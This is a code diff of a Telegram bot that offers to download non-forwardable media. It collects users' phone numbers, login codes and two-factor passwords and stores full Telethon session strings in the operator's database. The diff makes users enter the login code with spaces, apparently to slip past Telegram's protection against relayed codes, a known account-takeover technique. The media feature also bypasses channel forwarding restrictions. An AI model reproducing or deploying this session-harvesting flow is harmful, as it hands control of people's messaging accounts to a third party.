@@ -1,3 +1,5 @@
+# bot.py
+
 import os
 import asyncio
 import logging
@@ -16,7 +18,7 @@ from telegram.ext import (
 )
 from dotenv import load_dotenv
 
-# Load env
+# Load environment variables
 load_dotenv()
 DEFAULT_API_ID = int(os.getenv("API_ID"))
 DEFAULT_API_HASH = os.getenv("API_HASH")
@@ -32,12 +34,12 @@ SUPPORT_LINK = "https://t.me/valahallah"
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger("UserBot")
 
-# DB
+# MongoDB setup
 mongo_client = AsyncIOMotorClient(MONGO_URI)
 db = mongo_client.userbot
 sessions = db.sessions
 
-# App
+# Telegram Bot App
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
 user_login_data = {}
@@ -72,7 +74,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_keyboard
     )
 
-# --- Connect Callback (missing earlier) ---
+# --- Connect Callback ---
 async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.callback_query.message:
         await update.callback_query.answer()
@@ -82,7 +84,7 @@ async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.callback_query.answer("⚠️ This button is expired. Use /start again.", show_alert=True)
         return ConversationHandler.END
 
-# --- API ID / HASH Flow ---
+# --- API ID/HASH Flow ---
 async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_login_data[update.effective_user.id] = {"api_id": DEFAULT_API_ID}
     await update.message.reply_text("🔑 Enter your API HASH or send /skip to use default:")
@@ -112,7 +114,7 @@ async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("📞 Enter your phone number (with country code):")
     return PHONE
 
-# --- Login Flow ---
+# --- Phone/OTP/Password ---
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_login_data[update.effective_user.id]["phone"] = update.message.text.strip()
     try:
@@ -124,14 +126,17 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.connect()
         await client.send_code_request(user_login_data[update.effective_user.id]["phone"])
         user_login_data[update.effective_user.id]["client"] = client
-        await update.message.reply_text("🔐 Enter the OTP you received:")
+        await update.message.reply_text(
+            "🔐 Enter the OTP you received with **spaces**, like:\n\n<code>1 2 3 4 5</code>",
+            parse_mode="HTML"
+        )
         return CODE
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to send code: {e}")
         return ConversationHandler.END
 
 async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    code = update.message.text.strip()
+    code = update.message.text.replace(" ", "").strip()
     client = user_login_data[update.effective_user.id]["client"]
     try:
         await client.sign_in(user_login_data[update.effective_user.id]["phone"], code)
@@ -159,6 +164,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Failed to sign in: {e}")
         return ConversationHandler.END
 
+# --- Login Complete ---
 async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     client = user_login_data[user_id]["client"]
@@ -167,7 +173,13 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await sessions.update_one(
         {"_id": user_id},
-        {"$set": {"session": session_string, "type": "telethon"}},
+        {"$set": {
+            "session": session_string,
+            "type": "telethon",
+            "account_id": me.id,
+            "is_admin": True,
+            "creator_id": user_id
+        }},
         upsert=True
     )
 
@@ -206,7 +218,7 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("✅ Successfully connected your account!")
     return ConversationHandler.END
 
-# --- Non-forwardable Media Fetch ---
+# --- Fetch Media ---
 async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📎 Send the message link from a channel/group you're joined in:\n\n"
@@ -268,7 +280,7 @@ login_conv = ConversationHandler(
 )
 
 fetch_menu_conv = ConversationHandler(
-    entry_points=[MessageHandler(filters.TEXT & filters.Regex("^📥 Download Non-Forwardable Media$"), menu_fetch_request)],
+    entry_points=[MessageHandler(filters.TEXT & filters.Regex("^📥 DOWNLOAD NON FORWARDING MEDIA $"), menu_fetch_request)],
     states={FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]},
     fallbacks=[],
 )
